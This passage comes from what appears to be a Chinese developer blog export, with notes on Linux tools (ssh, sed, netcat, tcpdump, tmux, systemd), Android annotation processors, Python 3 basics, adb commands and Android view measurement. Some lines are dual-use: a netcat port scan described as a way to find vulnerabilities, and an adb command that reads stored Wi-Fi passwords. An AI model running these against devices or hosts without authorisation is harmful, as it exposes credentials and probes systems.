。这才发现刚才的操作就是把公钥内容追加到这个文件后面了。注意这个文件的权限应该是400在本地mac的~/.ssh/config 文件中添加这个Host。User，HostName, Port, authorizedFile什么的。给这个server起个名字，比方叫做: Remy再来把这个key添加 ssh-add -k id_rsa_xxx ，这样不用每次都输入passphrase(会出来一个Identity added: id_rsa_xxx)。最后 ssh Remy ，一切顺利的话，就可以登录成功了 编码的修改更改locale为utf-8(ubuntu) vi ~/.bashrc # add these lines export LC_ALL=en_US.UTF-8 export LANG=en_US.UTF-8 export LANGUAGE=en_US.UTF-8 sudo locale-gen &quot;en_US.UTF-8&quot; sudo dpkg-reconfigure locales 12. sed命令sed 是一种在线编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。本身是不会更改文件内容的。 ##把一段字符串插入文件的第四行和第五行之间，默认是送到了标准输出，加一个重定向更改了文件内容 sed -e 4a\\/&quot;this will be append to the 5th line&quot; sample.txt &gt;&gt; sample.txt ## 注意这个斜杠是为了语法高亮加的 ## 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！ nl /etc/passwd | sed &#39;2,5d&#39; 14. 多个tty(TeleTypewriter)how-to-multitask-in-the-linux-terminal-3-ways-to-use-multiple-shells-at-once sudo apt-get install screenscreen 。进入一个新的GNU screen // 可以执行耗时指令按住ctrl +a ，再按d 。退出screenscreen -r // 重新进刚才的screen 15. ipv6 howto## 首先在开启ipv6的机器上确认是否开启了ipv6 ifconfig ## 看下是否有ipv6 address netstat -tuln ## 看下当前连接中是否有ipv6 addr ifconfig的输出大致如下： inet6 addr: 2001:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx/64 Scope:Global inet6 addr: fe80::xxxx:xxxx:xxxx:xxxx/64 Scope:Link [What’s that % sign after ipconfig IPv6 address?](https://howdoesinternetwork.com/2013/ipv6-zone-id) ## 那个/64不要管，2001.xxx粘贴到[ipv6now](http://ipv6now.com.au/pingme.php) ## 然后用一些online ipv6 website ping一下 16.netcat , cryptcatoracle pagenetcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。netcat所做的就是在两台电脑之间建立链接并返回两个数据流。netcat = nc nc -z -v -n 172.31.100.7 21-100 ##用来扫描这台机器上开放的端口，用来识别漏洞 z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换 v 参数指使用冗余选项 verbose n 参数告诉netcat 不要使用DNS反向查询IP地址的域名 numeric u 参数使用udp ，默认是tcp ## on the server side ，创建一个chat 服务器 netcat -l -p 38929 ## l listen p port ，大写的L表示socket断了之后自动重连 ## client nc 172.31.100.7 38929 ### now the server and client can talk to each other ## 文件传输 ### server nc -l 1567 &lt; file.txt ## client nc -n 172.31.100.7 1567 &gt; file.txt ### 传输目录 ### server tar -cvf – dir_name | nc -l 1567 ### client nc -n 172.31.100.7 1567 | tar -xvf - Linux Netcat 命令——网络工具中的瑞士军刀 17. WireShark and netcap首先是wireShark和fiddle的对比Wireshark vs Firebug vs Fiddler - pros and cons? Wireshark, Firebug, Fiddler all do similar things - capture network traffic.Wireshark captures any kind of a network packet. It can capture packet details below TCP/IP(Http is at the top). It does have filters to reduce the noise it captures.Fiddler works as a http/https proxy. It captures each http request the computer makes and records everything associated with it. Does allow things like converting post varibles to a table form and editing/replaying requests. It doesn’t, by default, capture localhost traffic in IE, see the FAQ for the workaround.The benefit of WireShark is that it could possibly show you errors in levels below the HTTP protocol. Fiddler will show you errors in the HTTP protocol. 简单来说就是fiddle只抓http(s)层的packet,wireShark抓的是tcp(udp)层的。 wireShark &gt; fiddler(Charles 也差不多，只抓http层的) 基本的流程是：首先在linux上生成dump.pcap文件，然后在wireShark中打开(对了要先去wireshark官网下windows的安装文件，注意不要装上全家桶就是了)； 聊聊tcpdump与Wireshark抓包分析 sudo tcpdump -i &quot;venet0:0&quot; //tcpdump需要sudo权限 sudo tcpdump -c 10 //count sudo tcpdump -c -A //Asicii码形式展示出来每个package sudo tcpdump -c 5 -i wlo1 // 监听某一个网卡 sudo tcpdump -c 5 -i wlo1 port 22// 监听某一个网卡某一个端口 sudo tcpdump -i eth0 -w dump.pcap -v //w表示要保存的文件的位置 // 注意运行上述指令的时候，会显示Got 18 这种提示，意味着已经抓到了多少个包，这个数其实也是随着时间流逝一直增长的。 ctrl+c停止抓包，会生成一个dump.pcap文件(不要尝试着去cat 或者less，是一个binary 文件，会崩的)。 tmux开两个窗口，就是在curl百度的时候抓包 tcpdump -nn -t host www.baidu.com curl -I www.baidu.com tcpdump version 4.5.1 libpcap version 1.5.3 Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ] [ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ] [ -i interface ] [ -j tstamptype ] [ -M secret ] [ -P in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z command ] [ -Z user ] [ expression ] 18.ubuntu desktop预设的desktop environment叫做unity比较常见的linux desktop 还有gnome,KDE ,plasma,Ma tei, cinnamon. 19.tmux使用tmux是多窗口神器，再也不用傻乎乎的去开screen了，远程server也能用。tmuxcheatsheettmux创建的窗口叫做pane，关闭的方式有exit和ctrl+b xctrl+B // prefix,基本上就是让tmux开始接收后面的指令ctrl + b + “ //纵向排列ctrl + b + % //横向排列ctrl + b + z //zoom到这个pane,再按下ctrl+b +z 使当前pane退出全屏ctrl + b + c //创建一个新窗口ctrl + b +p //previous窗口 n就是next窗口ctrl + b 2 //跳到第2个窗口ctrl +b + &amp; 干掉当前窗口ctrl +b + , 重命名当前窗口 接下来看如何修改配置修改 ~/.tmux.conf 文件，如果没有就创建一个 每次都要按ctrl+b实在是太麻烦，改成ctrl+a吧，因为a距离ctrl近一点。下面三行就改好了 set-option -g prefix C-aUNBIND-KEY C-abind key C a send prefix tmux有一个很重要的概念- session tmux list-sessions // 列出当前所有sessionstmux ls // 列出当前所有sessionsctrl+b + $ //可以重命名session如果从一个terminal中开了一个tmux session，然后直接右上角关闭terminal，在其他的terminal中就能看到这个session不是attached的状态如果不想用点击右上角叉号的方式退出session，可以使用ctrl +B +d //disconnect from current session.这样就不用关闭整个terminal了tmux attach -t vim-dev //假设vim-dev是一个session的名字一个好玩的现象是，如果开两个terminal，连接到同一个session，任何在一个session的操作都会在另一个session的terminal中显示，就像远程协助一样。ctrl +b + ( //切换到前一个sessionctrl +b + ) //切换到下一个session tmux开了上下两个窗口之后怎么滑动ctrl + b + [ ， 然后键盘上下就可以滑动了 , q是退出 20. 使用systemd管理程序Systemctl是一个systemd工具，主要负责控制systemd系统和服务管理器。systemd中一项服务称为unitLinux开机启动管理—systemd使用 sudo systemctl start application ## 比方说nginx sudo systemctl status nginx ## 看下状态 sudo systemctl restart application.service sudo systemctl reload application.service sudo systemctl reload-or-restart application.service sudo systemctl enable application.service ##开机启动 ## 开机启动的原理是往/lib/systemd/system或者/etc/systemd/system这个目录下创建了类似于nginx.service的symbolic link。 ## 指向在这个文件夹下创建的xxx.target.wants文件 **记得修改了.service文件要reload一下systemd** &gt;# 重新加载配置文件 $ sudo systemctl daemon-reload # 重启相关服务 $ sudo systemctl restart foobar sudo systemctl disable application.service ## 禁止开机启动 ## 这句话就是取消了symbolic link sudo systemctl is-active nginx.service ## 看下在不在跑 active systemctl is-enabled application.service systemctl is-failed application.service systemctl list-units --all ## 所有systemd加载（或者尝试过加载）的程序 systemctl list-units --all --state=inactive ## 只看active的 systemctl list-unit-files ## 和list-units不一样，这里还包括了systemd为尝试过parse的配置 sudo systemctl halt ## 挂起 sudo systemctl poweroff ## 关机 sudo systemctl reboot ## 重启 其实sudo reboot也是指向/bin/systemctl的软链接 systemctl cat sshd.service ## 查看一个服务的配置文件 系统基本service服务配置目录（此目录勿动，一般情况下只放系统核心基础服务配置，否存放应用注册类服务配置）：/etc/systemd/system，自定义服务配置管理目录（存放自定义应用注册类服务和第三方服务类配置）：/usr/lib/systemd/system/ 自定义.service配置文件，实现开机自启(开机执行一个sh脚本)的步骤 创建一个start-script.service文件(权限改成754),大致内容如下 [Unit]Description=”app-run@Author Jack Liu Process Daemon” # 服务描述After=rc-local.service # 服务类别： # 例启动顺序(默认在rc-local.service之后调用执行) [Service]Type=forking # 优先使用forking方式: # (遵循传统Unix做法,设置PIDFile=选项 # 帮助systemd准确定位该服务的主进程) PIDFile=/var/run/app-run.pid # 设置应用进程的PID（缺省）Environment=”GOPATH=/usr/local/go” # 环境变量设置，可设置多个Environment=项 # 备注：Environment= 或 EnvironmentFile= # 引用文件, 两种方式皆可 ExecStart=/data/auto_run.sh start # 调用启动可执行文件： 这就是要执行的sh脚本 # （Service配置全部使用绝对路径， # 可执行文件内命令用绝对的路径格式） ExecReload=/data/auto_run.sh reload # 重新加载（缺省）ExecStop=/data/auto_run.sh stop # 停止服务（缺省）DefaultTimeoutStartSec=30 # 服务启动允许的最大时长，超时时间（默认无单位:秒） # 单位：&quot;ms&quot;(毫秒), &quot;s&quot;(秒), &quot;min&quot;(分钟), # &quot;h&quot;(小时), &quot;d&quot;(天), &quot;w&quot;(周) PrivateTmp=True # 是否分配独立的临时空间（缺省）[Install]WantedBy=multi-user.target 把这个文件复制到/usr/lib/systemd/user文件夹中 在/data/auto_run.sh这个脚本中写自己的业务逻辑,比如说 #!/bin/bashdate &gt;&gt; /tmp/date 把这个service注册到系统中systemctl enable start-script.service 搞定,如果service文件不会写的话，看下/lib/systemd/system/nginx.service就好了 systemctl带来的一个好处是可以直接使用journalctl命令查看所有Unit的启动日志(内核日志和应用日志)。日志的配置文件是/etc/systemd/journald.conf ## 查看所有日志（默认情况下 ，只保存本次启动的日志） $ sudo journalctl # 查看系统本次启动的日志 $ sudo journalctl -b $ sudo journalctl -n 20 //查看20行 $ sudo journalctl --since yesterday sudo journalctl -u yourservice //不带后面的.service ## 还有很多，能够知道系统启动时发生了什么 sudo journalctl --disk-usage //看下当前journalctl占用了多少磁盘容量 journalctl --vacuum-time=2d //只保留过去两天的日志 journalctl --vacuum-size=500M //只保留最多500MB的日志 https://unix.stackexchange.com/questions/139513/how-to-clear-journalctl systemd出错了debug简直要命，一种方式是，less +F /var/log/syslog 只是想要通过systemd去启动一个开机脚本的话 [Unit] Description=run shell script [Service] Type=oneshot ExecStart=/usr/bin/yourscript [Install] WantedBy=multi-user.target 然后可以看一下你这个task的状态 sudo systemctl status 上面这个文件的名字.servicesudo systemctl start 上面这个文件的名字.service ## 手动去启动也是可以的 fdisk -l ## show a list of hard drives that are attached to your computer, fdisk就是硬盘分区命令 21. 关于命令行中标点符号的使用在unix系统上参数的分隔符是” : “在windows系统上分割符是” ; “还有就是forward slash和back slash了 nl (类似于cat，只是展示文本的时候带上行号),fold(限定每一行最多多少个字符，超过了自动换行) curl ipinfo.io/ip 用于获取本机外部ip地址 参考 工具参考 文件大小查看命令 文件压缩命令 硬件查询 Python源码编译安装ss 源码编译安装ss 修改系统编码为utf-8 Linux工具快速教程","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"使用AnnotationProcessor自动生成代码","date":"2016-12-31T22:42:15.000Z","path":"2016/12/31/2016-12-31-Eliminating-BoilPlate-AnnotationProcessor/","text":"记得Romain Guy在一次DroidCon上曾说过: As I understand, modern java development are all about wrting annaotation Processors and not wrting code anymore… 全场观众大笑。。。 这之后经常看到Jack Wharton在演讲中提到”My Hypothetical Annotation Processor…” ，后来才意识到像Retrofit，ButterKnife这些都是使用了注解的方式。 1. 原理介绍Annotation Processoring Tool是javac的一部分，它会在编译期生成新的.java文件（不是class文件）定义一个Annotation的语法如下： @Documented @Target(ElementType.TYPE) //这说明生成的注解能够放在class,interface,enum等类型上。不能放在method上 @Retention(RetentionPolicy.SOURCE) //指明在编译器有效 public @interface Builder { //@interface就像class,interface,enum一样 } 2.Annotation Processor是生成新代码的实现类大致的实现例如： public class PojoStringProcessor extends AbstractProcessor { private static final String ANNOTATION = &quot;@&quot; + PojoString.class.getSimpleName(); private static final String CLASS_NAME = &quot;StringUtil&quot;; private Messager messager; //有点像Logger,用于输出信息 private Filer filer //可以获得Build Path，用于生成文件 //public构造函数不写也会自动加上 // init做一些初始化操作 @Override public synchronized void init(ProcessingEnvironment processingEnv) { super.init(processingEnv); messager = processingEnv.getMessager(); this.filer = processingEnv.getFiler(); } //apt在检查被注解的class时，会返回你需要的注解类型 @Override public Set&lt;String&gt; getSupportedAnnotationTypes() { return immutableSet.of(Builder.class.getCanonicalName()); } //java7,java8 有点像android的targetSdk Version @Override public SourceVersion getSupportedSourceVersion() { return SourceVersion.latestSupported(); } //重点 @Override public boolean process(Set&lt;? extends TypeElement&gt; annotations, RoundEnvironment roundEnv) { ArrayList&lt;AnnotatedClass&gt; annotatedClasses = new ArrayList&lt;&gt;(); for (Element element : roundEnv.getElementsAnnotatedWith(PojoString.class)) { TypeElement typeElement = (TypeElement) element; if (!isValidClass(typeElement)) { return true; //apt找到的所有被注解的class } try { annotatedClasses.add(buildAnnotatedClass(typeElement)); } catch (IOException e) { String message = String.format(&quot;Couldn&#39;t process class %s: %s&quot;, typeElement, e.getMessage()); messager.printMessage(Diagnostic.Kind.ERROR, message, element); e.printStackTrace(); } } try { generate(annotatedClasses); } catch (IOException e) { messager.printMessage(Diagnostic.Kind.ERROR, &quot;Couldn&#39;t generate class&quot;); } return true; } } 几个重要的方法解释下： roundEnv: apt分两步：1. apt发现被注解的代码，提供给我们写的processor，后者生成新的java代码(apt还未处理这部分新代码)。 apt发现新代码，提供给我们的Processor，不生成新代码。完成processing。（后面提供给编译） ServiceLoader Discovery File（这货在jar中）//META-INFO/services/javax.annotations.processing.Processor文件中写入com.example.annotation.BuilderProcessor// class包名//这里声明所有的processor，这里可以include别的processor 语法： app/build.gradle dependencies { compile project(&#39;: annotation&#39;) apt project (&#39;:processor&#39;) } //apt 表示processor中的方法不会带到distributed apk中,方法数不用担心了 //https://bitbucket.org/hvisser/android-apt //https://github.com/tbroyer/gradle-apt-plugin 继承AbstractProcessor，必须要有一个无参public构造函数 3. 生成新的java方法首先添加依赖，square的javaPoet 假设想生成的代码是这样的 public final class UserBuilder{ private String userName; public UserBuilder username(String username){ this.username = username; returen this; } } 生成变量 生成方法 生成class: 直接截图了 主要步骤 meta_data 生成private field和public setter: FiledSpec username = FiledSpec.builder(String.class,”username”,Modifier.PRIVATE).build(); 生成build method 生成builder 写java文件： 4. 注意的地方dnot’t put annotation processors in a compile configuration, use the Android Apt plugin。 if you using jack, jack has support for annotation processors. if it’s only a java, could use the Gradle Apt Plugin 我们写的processor不会带到生成的apk中，但生成的代码会。这也正是想要的目的。 updatesInstagram的json parser也是使用了annotationProcessor在编译期生成代码 很多gson这样的解析器都使用了大量的反射，所以相比手写的构造函数要慢很多。 ref android gradle plugin 2.3的兼容问题 Android沉思录 Droidcon NYC 2016 - @Eliminate(“Boilerplate”) Gradle Apt Plugin Andorid Apt Plugin","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"annotation","slug":"annotation","permalink":"https://haldir65.github.io/tags/annotation/"}]},{"title":"Python 3 学习记录","date":"2016-12-24T22:06:37.000Z","path":"2016/12/24/2016-12-24-Python-UnicodeEncodeError/","text":"人生苦短，Python是岸 1. Python的一些缺点引用廖雪峰的官方网站上的话，Python一个是慢，一个是代码不能加密 第一个缺点就是运行速度慢，和C程序相比非常慢，因为Python是解释型语言，你的代码在执行时会一行一行地翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以很慢。而C程序是运行前直接编译成CPU能执行的机器码，所以非常快。 第二个缺点就是代码不能加密 GIL导致的多线程低效率 以下内容出自静觅 » Python爬虫进阶五之多线程的用法 1、GIL是什么？ GIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。 2、每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。） 在Python多线程下，每个线程的执行方式： 获取GIL 执行代码直到sleep或者是python虚拟机将其挂起。 释放GIL 可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。 在Python2.x里，GIL的释放逻辑是当前线程遇见IO操作或者ticks计数达到100（ticks可以看作是Python自身的一个计数器，专门做用于GIL，每次释放后归零，这个计数可以通过 sys.setcheckinterval 来调整），进行释放。 而每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)，这就是为什么在多核CPU上，python的多线程效率并不高。 2. 安装package各种can’t resolve XXXno module named urllib2 The urllib2 module has been split across several modules in Python 3 named urllib.request and urllib.error. The 2to3 tool will automatically adapt imports when converting your sources to Python 3. This is what look like on py 2.7 import urllib2 req = urllib2.Request(url,headers=header) html = urllib2.urlopen(req) html_data = html.read html_path = etree.HTML(html_data) on Python 3.X from urllib.request import urlopen from urllib.request import Request req = Request(img_url, headers=headers) urlhtml = urlopen(req) 如果是自己写了一个.py文件，调用里面的函数,import的时候要把包路径写完整 3. pip install XXXX安装package的方式 pip install xxxx….很多包会建议你来一个pip install -U XXX这个U的意思是upgrade if alreay install if not working 4. List、tuple、dict、set以及基本的数据类型 list mylist = [&#39;Tom&#39;,&#39;Jerry&#39;,&#39;Henry&#39;] mylist[0] = &#39;Tom&#39; tuple mytuple = (&#39;rock&#39;,&#39;pop&#39;,&#39;jazz&#39;) mytuple[0] = &#39;rock&#39; tuple在初始化时就已经确定，不能修改 dict: d={&#39;name&#39;:&#39;tom&#39;,&#39;job&#39;:&#39;doctor&#39;,&#39;age&#39;,99} d[&#39;name&#39;] = &#39;tom&#39; set: s = set([1,2,3]) # 需要传入一个list作为参数 &gt;&gt; s {1,2,3} set无序，不可有重复元素 set和dict的区别在于前者没有存储value，两者内部都不能有重复元素(key) tuple用的比较多，例如有多个返回值的函数，Python其实返回了一个Tuple。 类名应该写成驼峰样式，变量名应该小写class name should be cammelCase, Arguments,variable name should be lowercase 循环 for i in range(2, 5): print(i) &gt;&gt;&gt; result: 2 3 4 左闭右开 条件判断 def add_end(L=None): if L is None: L = [] L.append(&#39;END&#39;) return L 函数参数相关，函数组合（一共五种）位置参数，默认参数，可变参数，关键字参数，命名关键字参数 定义一个函数可以带上默认值，默认值是一个固定的对象，上次操作的值会保留到下一次调用 def sell(name,price,amount=1): print(price*amount) sell(&#39;product&#39;,26) sell(&#39;product&#39;,26,2) &gt;&gt;&gt; 26 &gt;&gt;&gt; 52 默认参数函数 def power(x, n=2): #这里的n=2就是默认参数，注意，默认参数应该是不可变对象,例如str、None这种 s = 1 while n &gt; 0: n = n - 1 s = s * x return s power(5) &gt;&gt; 25 power(5,2) &gt;&gt;&gt;25 可变参数函数# 定义的时候在参数前面加一个*号就可以了，内部会默认组装成一个tuple def calc(*numbers): #函数内部接收到的是一个tuple sum = 0 for n in numbers: sum = sum + n * n return sum calc(1,2) calc(2,3,5) nums = [1,2,3] cal(*nums)#把tuple内的元素作为参数传进去 关键字参数 def person(name, age, **kw): print(&#39;name:&#39;, name, &#39;age:&#39;, age, &#39;other:&#39;, kw) &gt;&gt;&gt; person(&#39;Michael&#39;, 30) name: Michael age: 30 other: {} 内部自动将关键字参数转换成一个dict 命名关键字函数 def shoppping(name,time,*,price,count)# price可以有默认值 print(price*count) &gt;&gt; shopping(john,0325,price=39,count=5) &gt;&gt; 195 5. 爬虫相关Chrome自带开发者工具，可以查看每一个request的header，cookies等信息。模拟浏览器行为比较有效。ctrl+shift+R神器 5.1 Request, Urllib25.2 UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position就中文来说 GB18030 》 GBK 》 GB2312 # how to invoke this error b = &quot;this is english within ascii range&quot;.encode(&#39;ascii&#39;) # totally fine s = &quot;你好&quot;.encode(&#39;ascii&#39;) # this will raise an error ,UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode characters in position 0-1: ordinal not in range(128)&gt; print((b&quot;totally cool binary representation of english words within ascii range&quot;).decode(&#39;ascii&#39;)) print((b&quot;totally cool binary cause utf-8 include ascii&quot;).decode(&#39;utf-8&#39;)) # 完全正常 # eg. string = &quot;你好啊&quot; binary_string = b&#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a&#39; binary_string_2_string = bstring.decode(&#39;utf-8&#39;) code : print(string) print(string.encode(&#39;utf-8&#39;)) print(bstring2string) print(bstring2string) print(which_instance_is_this(string)) print(which_instance_is_this(bstring)) print(which_instance_is_this(bstring2string)) outputs: 你好啊 b&#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a&#39; 你好啊 你好啊 is str is byte is str **Since Python 3.0, the language features a str type that contain Unicode characters, meaning any string created using &quot;unicode rocks!&quot;, &#39;unicode rocks!&#39;, or the triple-quoted string syntax is stored as Unicode.** 冒号里面的都是str，都是unicode的集合。生成unicode可以用chr(12345) ，该方法接受一个integer返回一个长度为1的Unicode String。 反过来可以用ord(你) 生成“你”这个字在unicode中的编号 print(chr(20320)) &gt;&gt;&gt;&gt; 你 print(ord(&#39;你&#39;)) &gt;&gt;&gt;&gt; 20320 #这里只能用长度为1的string binary to string is called decode ,string to binary is encode bytes.decode(&#39;utf-8&#39;) &lt;----&gt; str.encode(&#39;utf-8&#39;) 回到UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode characters in position str.encode(&#39;ascii&#39;)，unicode字符超出了ascii的范围，无法decode成binary 6.一些细节文件读写的各种模式以及解码问题 with open(filepath, &#39;r&#39;, encoding=&quot;utf8&quot;) as f: f.write(&#39;最好用utf8读和写文件&#39;) #已经自动做好close文件的工作 how to upgrade installed packages? pip install –upgrade setuptools 迭代一个字典，并打印出key,vaule for key,value in d.items(): # 这个items函数其实是字典自带的函数 print(&#39;%s key has the value %s&#39;%(key,value)) #第三个百分号是用来把key填到第一个百分号后，把value填到第二个百分号后面的 # 用普通的for i 方式迭代一个字典，迭代出来的是一个个的key，可以用dict[key]把value搞出来 7. 在PyCharm中使用virtualenvvirtualenv一般都是在命令行里面创建，PyCharm里面，setting-project-project Interpreter 那个选择的箭头右边有一个齿轮，直接创建一个新的就好了。virtualenv的好处是不会干扰机器上已安装的package，有些包现在还只能在2.7下运行，如flask_mail。用完之后，ide cmd输入 deactivate即可退出virtualenv。 Kenneth Reitz - Pipenv: The Future of Python Dependency Management - PyCon 2018 PipEnv取代virtualenv 8.在linux环境中运行Python及调用系统API计算当前系统磁盘空间占用率推荐使用os.subprocess模块调用shell grep log in command consolebasic grammarsnetwork, disk ,database, io , dic, list ,etcclass object orientated 9. future模块是为了在2.7中使用3的功能from __future__ import division print &#39;10 / 3 =&#39;, 10 / 3 print &#39;10.0 / 3 =&#39;, 10.0 / 3 print &#39;10 // 3 =&#39;, 10 // 3 直接在2.7中使用3的除法（2.7中的除法是10/3=3，3中的除法是10/3=3.33333…） 参考 廖雪峰的官方网站 静觅 unicodeencodeerror-ascii-codec-cant-encode-character Droidcon NYC 2016 - Decoding the Secrets of Binary Data Jake Wharton and Jesse Wilson - Death, Taxes, and HTTP Droidcon Montreal Jake Wharton - A Few Ok Libraries Jesse Wilson - Coordinating Space and Timeselenium教程深复制和浅复制的区别如何使用全局变量, global variables are dangerous","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"adb常用命令手册","date":"2016-12-10T21:14:14.000Z","path":"2016/12/10/2016-12-10-adb-command/","text":"ADB 常用命令手册平时在android studio中用command的时候还有点不熟悉，找到一篇博客，记录下来，作为日常参考。希望后期能够有时间把Google IO上添加的一些命令加上来 获取序列号： adb get-serialno 查看连接计算机的设备： adb devices 重启机器： adb reboot 重启到bootloader，即刷机模式： adb reboot bootloader 重启到recovery，即恢复模式： adb reboot recovery 查看log： adb logcat 终止adb服务进程： adb kill-server 重启adb服务进程： adb start-server 获取机器MAC地址： adb shell cat /sys/class/net/wlan0/address 获取CPU序列号： adb shell cat /proc/cpuinfo 安装APK： adb install //比如：adb install baidu.apk 保留数据和缓存文件，重新安装apk： adb install -r //比如：adb install -r baidu.apk 安装apk到sd卡： adb install -s // 比如：adb install -s baidu.apk 卸载APK： adb uninstall //比如：adb uninstall com.baidu.search 卸载app但保留数据和缓存文件： adb uninstall -k //比如：adb uninstall -k com.baidu.search 启动应用： adb shell am start -n /. 查看设备cpu和内存占用情况： adb shell top 查看占用内存前6的app： adb shell top -m 6 刷新一次内存信息，然后返回： adb shell top -n 1 查询各进程内存使用情况： adb shell procrank 杀死一个进程： adb shell kill [pid] 查看进程列表： adb shell ps 查看指定进程状态： adb shell ps -x [PID] 查看后台services信息： adb shell service list 查看当前内存占用： adb shell cat /proc/meminfo 查看IO内存分区： adb shell cat /proc/iomem 将system分区重新挂载为可读写分区： adb remount 从本地复制文件到设备： adb push 从设备复制文件到本地： adb pull 列出目录下的文件和文件夹，等同于dos中的dir命令： adb shell ls 进入文件夹，等同于dos中的cd 命令： adb shell cd 重命名文件： adb shell rename path/oldfilename path/newfilename 删除system/avi.apk： adb shell rm /system/avi.apk 删除文件夹及其下面所有文件： adb shell rm -r 移动文件： adb shell mv path/file newpath/file 设置文件权限： adb shell chmod 777 /system/fonts/DroidSansFallback.ttf 新建文件夹： adb shell mkdir path/foldelname 查看文件内容： adb shell cat 查看wifi密码： adb shell cat /data/misc/wifi/*.conf 清除log缓存： adb logcat -c 查看bug报告： adb bugreport 获取设备名称： adb shell cat /system/build.prop 查看ADB帮助： adb help 跑monkey： adb shell monkey -v -p your.package.name 500 录制视频 adb shell screenrecord /sdcard/demo.mp4 生成的Demo.mp4文件在根目录下面，默认录制时长180s按下ctrl+c 停止录制注意，最好在开发者选项里面，把显示触摸操作打开，这样视频中能显示用户点击操作位置 ADB无线调试 $adb tcpip 5555$ adb connect &lt;\\device-ip-address&gt;$ adb devicesdone ANR的日志放在/data/anr/traces.txt里面./adb pull path_to_file location_to_save就能搞出来了 $ adb shell ps | grep bbk ## 在一台步步高手机上u0_a24 11843 730 1808812 61012 SySepoll 0000000000 S com.bbk.appstoresystem 13140 730 1773144 51608 SySepoll 0000000000 S com.bbk.facewakeu0_a80 13464 730 1772072 46280 SySepoll 0000000000 S com.bbk.calendar $ adb shell cat /proc/11843/oom_adj/system/bin/sh: cat: /proc/11843/oom_adj: Permission denied LowMemory Killer实现搜索关键字(oom_adj) adb su进terminal找一台root了的手机adb shellsu//好了，现在可以进root模式了pm list packagespm clear PACKAGE //删掉/data/data/package里面的东西//启用/禁用app或者组件,需要su执行pm enable [–user USER_ID] PACKAGE_OR_COMPONENTpm disable [–user USER_ID] PACKAGE_OR_COMPONENTpm reset //重置所有应用的权限 这里面就有很多可以做的了 am stack listam start -n com.huxiu/com.huxiu.ui.activity.SplashActivity //命令行启动某应用am start -n com.android.browser/com.android.browser.BrowserActivity //命令行开浏览器 参考: 张明云的博客 adb无线调试","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"adb","slug":"adb","permalink":"https://haldir65.github.io/tags/adb/"}]},{"title":"wrap_content到底多大","date":"2016-11-27T16:46:44.000Z","path":"2016/11/27/2016-11-27-the-size-of-wrap-content/","text":"转眼就十一月了，java的分析越来越少，虽然常常在业务上碰到不少坑。。。 问题的由来这周碰到一个需要画时间轴样式的自定义View的需求，大概像这样(图片来自网络)： 要求，左侧的圆形节点可以自定义Drawable，右侧的文字高度随文字数量变化自适应。 想想也就是自定义ViewGroup的那一套老样子。抄起键盘就开始研(Copy)究(Paste)，写着写着发现不对劲，主要的问题包括: 在onMeasure里面拿到的height == 0 , 具体一点就是:整个ViewGroup包含多个Item，每个Item包括左侧的自定义View(CustomView)，高度是wrap_content，右边的TextView高度是wrap_content(自适应嘛)。可是debug时发现左侧的自定义View拿到的高度是0，简直日了哈士奇了。随后拿着关键词去Google搜索，还是没有什么收获。 protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { final int widthMode = MeasureSpec.getMode(widthMeasureSpec); final int heightMode = MeasureSpec.getMode(heightMeasureSpec);// 这里是UNSPECIFIED, 常规概念里wrap_content对应的应该是AT_MOST final int widthSize = MeasureSpec.getSize(widthMeasureSpec); final int heightSize = MeasureSpec.getSize(heightMeasureSpec); // 居然等于0 } 回顾这个Item的实现，Item继承自RelativeLayout，左边的View是调用addView(view,RelativeLayout.Layoutparams)加进去的,params设置了一些rules，像是AlignParentLeft这种，记得给左边的View和右边的TextView都设置一个id就好。TextView也是这样addView进去的。后来查到了秋百万对于MeasureSpec的介绍，我想到RelativeLayout的onMeasure会调用两次，在第一次测量的时候，左边的View和右边的TextView都把高度设置为wrap_content了。要命的是这个Item本身添加到UI的方式也是类似的addView(view,RelativeLayout.Layoutparams)方式，这里的height也是wrap_content。即Item本身高度需要由其child决定，左边的child决定不了，只有右边的TextView才能决定。所以第一轮测量下来，左边的View的高度只能是0，右边的TextView高度倒是确定了。这时候Item本身的高度也就能确定了。在第二遍测量的时候，就能顺利拿到高度了。 左侧的每个节点上的drawable不画出来后来查了下，原因在于我对传进来的drawable检查了大小，太大的话用一个ScaleDrawable转一下。但是，scaleDrawable需要调用setLevel方法才会draw，我这里偷懒直接设置为1了。 